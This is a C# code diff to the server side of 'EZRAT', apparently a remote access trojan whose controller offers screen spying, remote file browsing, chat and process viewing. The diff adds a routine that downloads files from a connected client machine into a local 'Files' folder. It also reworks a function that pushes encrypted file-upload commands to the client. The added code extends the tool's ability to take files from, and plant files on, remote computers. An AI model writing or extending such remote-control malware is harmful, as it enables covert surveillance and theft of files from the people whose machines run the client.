@@ -25,9 +25,11 @@ namespace EZRATServer
         private Thread TConnect;
         private Thread scrnThread;
         public bool OnOffscreenSpy = false;
+        public bool OnOffDlFile = false;
         private int _port = 0;
         private static Socket _serverSocket;
         private uint screenShotNumber = 0;
+        public string fileNameDownload = string.Empty;
         FileBrowser fl;
         Chat cht;
         ProcessViewer pc;
@@ -306,7 +308,7 @@ namespace EZRATServer
             switch (e.ClickedItem.Text)
             {
                 case "File Browser":
-                    fl = new FileBrowser(this, GetIdClient() );
+                    fl = new FileBrowser(this, GetIdClient());
                     fl.Show();
                     SendCommand("lsdrives", GetIdClient());
                     SendCommand("lsfiles", GetIdClient());
@@ -638,6 +640,48 @@ namespace EZRATServer
                 Array.Copy(_buffer, recBuf, received); //Copy from the big array to the new array, with the size of the received bytes
                 bool ignoreFlag = false; //Declare the ignore flag
 
+
+                if (OnOffDlFile)
+                {
+                    string path = Environment.CurrentDirectory;
+                    int size = 1024;
+                    long sizeFile = 0, tot = 0;
+                    if (!Directory.Exists($"{path}\\Files"))
+                    {
+                        Directory.CreateDirectory($"{path}\\Files");
+                    }
+                    FileStream fs = new FileStream($"{path}\\Files\\{fileNameDownload}", FileMode.Create);
+                    NetworkStream ns = new NetworkStream(this._clientSockets[GetIdClient()]);
+                    fs.Write(recBuf, 0, size);
+                    try
+                    {
+                        byte[] data = new byte[size];
+                        bool loop_break = true;
+                        ns.ReadTimeout = 500;
+                        do
+                        {
+                            int nb = ns.Read(data, 0, size);
+                            fs.Write(data, 0, nb);
+                            fs.Flush();
+                            tot += (uint)nb;
+                            Console.WriteLine($"Data size : {data.Length}");
+                            if(nb == -1)
+                            {
+                                loop_break = false;
+                            }
+                        } while (loop_break);
+                    }
+                    catch (IOException ex)
+                    {
+                        Console.WriteLine($"Total data : {tot} {ex.Message}");
+                        fs.Close();
+                        ns.Close();
+                    }
+
+                    OnOffDlFile = false;
+                }
+
+
                 try //Try
                 {
                     text = Encoding.Default.GetString(recBuf); //Get the text from the receive buffer
@@ -732,14 +776,15 @@ namespace EZRATServer
                         byte[] img = Encoding.Default.GetBytes(text);
                         ShowScreenShot(StreamToImage(img));
                     }
+
+
                 }
 
 
+                if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current); //If client is not disconnecting, restart the reading
             }
-
-
-            if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current); //If client is not disconnecting, restart the reading
         }
+
 
         public void ShowScreenShot(Image img)
         {
@@ -747,7 +792,7 @@ namespace EZRATServer
             {
                 scrnThread = new Thread(() =>
                 {
-                    scrn = new ScreenShotViewer(img,this);
+                    scrn = new ScreenShotViewer(img, this);
                     scrn.ShowDialog();
                 });
                 scrnThread.Start();
@@ -779,22 +824,19 @@ namespace EZRATServer
         }
 
 
-        public void SendFile(string path, string pathUploaded, int id)
+        public void SendFile(string path, string pathUploaded)
         {
-            if (!_clientSockets[id].Connected) //If the client isn't connected
+            if (!_clientSockets[GetIdClient()].Connected) //If the client isn't connected
             {
                 Console.WriteLine("Socket is not connected!");
                 return; //Return
             }
-
-
             try
             {
-
                 string data = Encrypt("upfile;" + pathUploaded + path.Substring(path.LastIndexOf('\\') + 1) + ";" + File.ReadAllText(path));
                 string header = data.Length.ToString() + "§";
                 byte[] result = Encoding.Default.GetBytes(header + data);
-                _clientSockets[id].Send(result);
+                _clientSockets[GetIdClient()].Send(result);
             }
             catch (Exception ex) //Failed to send data to the server
             {
